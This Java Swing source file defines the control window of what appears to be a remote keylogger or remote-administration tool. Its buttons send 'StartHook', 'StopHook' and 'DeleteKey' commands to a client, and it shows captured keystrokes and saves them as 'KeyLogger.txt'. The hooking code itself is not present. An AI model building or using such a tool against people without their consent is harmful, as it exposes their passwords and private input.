import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JScrollBar;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.ScrollPaneConstants;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.event.MouseListener;

public class KeyStroke extends JFrame implements MouseListener {
    private JButton butHook = new JButton("<html><center>" + "Hook" + "</center></html>");
    private JButton butUnhook = new JButton("<html><center>" + "Unhook" + "</center></html>");
    private JButton butSave = new JButton("<html><center>" + "Lưu file" + "</center></html>");
    private JButton butDel = new JButton("<html><center>" + "Xóa" + "</center></html>");
    private JTextArea textArea = new JTextArea();
    private Client client;

    private JButton[] buttons = { butHook, butUnhook, butSave, butDel};
    private static int frameWidth = 450;
    private static int frameHeight = 450;
    private static String title = "Keystroke";

    public KeyStroke(Client client) {
        setLocation(200, 100);
        setPreferredSize(new Dimension(frameWidth, frameHeight));
        CenterAlignTitle();

        setLayout(null);
        setResizable(false);
        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
        this.client = client;
    }

    void Open() {
        PrepareGUI();
        AddAction();
        setVisible(true);
    }

    void PrepareGUI() {
        textArea.setEditable(false);
        textArea.setBackground(new Color(255, 255, 255));
        textArea.setForeground(new Color(0, 0, 0));//
        textArea.setLineWrap(true);
        
        JScrollPane scrollPane = new JScrollPane(textArea);
        scrollPane.setBounds(15, 80, 420, 320);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

        JScrollBar sb = scrollPane.getVerticalScrollBar();
        sb.setValue(sb.getMaximum());
        add(scrollPane);

        butHook.setBounds(15, 10, 90, 60);
        butUnhook.setBounds(120, 10, 90, 60);
        butDel.setBounds(225, 10, 90, 60);
        butSave.setBounds(330, 10, 90, 60);

        for (JButton button : buttons) {
            PrepareButtonsGUI(button);
            add(button);
        }

        pack();
    }

    void AddAction() {
        butHook.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.SendCommand("StartHook");
            }
        });
        butUnhook.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.SendCommand("StopHook");
            }
        });

        butDel.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.SendCommand("DeleteKey");
            }
        });

        butSave.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                SaveFile();
            }
        });
    }

    public void ApplyText(String text) {
        textArea.setText(text);
    }

    public void SaveFile() {
        JFileChooser fileChooser = new JFileChooser(System.getProperty("user.dir"));
        fileChooser.setAcceptAllFileFilterUsed(false);
        fileChooser.addChoosableFileFilter(new FileNameExtensionFilter("*.txt", ".txt"));
        fileChooser.setSelectedFile(new File("KeyLogger.txt"));
        int value = fileChooser.showSaveDialog(this);
        if (value == JFileChooser.APPROVE_OPTION) {
            File fileToSave = fileChooser.getSelectedFile();
            String filePath = fileToSave.getParent();
            String fileName = fileToSave.getName();
            if (!fileName.endsWith(".txt")) {
                fileName += ".txt";
                fileToSave = new File(filePath, fileName);
            }
            try {
                fileToSave.createNewFile();
                FileOutputStream fileOutputStream = new FileOutputStream(fileToSave);
                fileOutputStream.write(textArea.getText().getBytes());
                fileOutputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void CenterAlignTitle() {
        this.setFont(new Font("System", Font.PLAIN, 14));
        Font f = this.getFont();
        java.awt.FontMetrics fm = this.getFontMetrics(f);
        int x = fm.stringWidth(title);
        int y = fm.stringWidth(" ");
        int z = (frameWidth/2) - (x/2);
        int w = z/y;
        String pad =" ";
        pad = String.format("%"+w+"s", pad);
        setTitle(pad+title);
    }

    private void PrepareButtonsGUI(JButton button) {
        button.setOpaque(true);
        button.setFont(new Font("System", Font.PLAIN, 12));
        button.setFocusable(false);
        button.setBackground(Color.decode("#E6E6FA"));//E8E8E8
        button.setBorder(new RoundedBorder(10));
        button.addMouseListener(this);
    }

    @Override
    public void mouseClicked(MouseEvent e) {
    }

    @Override
    public void mousePressed(MouseEvent e) {
    }

    @Override
    public void mouseReleased(MouseEvent e) {
    }

    @Override
    public void mouseEntered(MouseEvent e) {
        e.getComponent().setBackground(Color.decode("#B8C7F4"));// DCDEE6
    }

    @Override
    public void mouseExited(MouseEvent e) {
        e.getComponent().setBackground(Color.decode("#E6E6FA"));// DCDEE6
    }

}
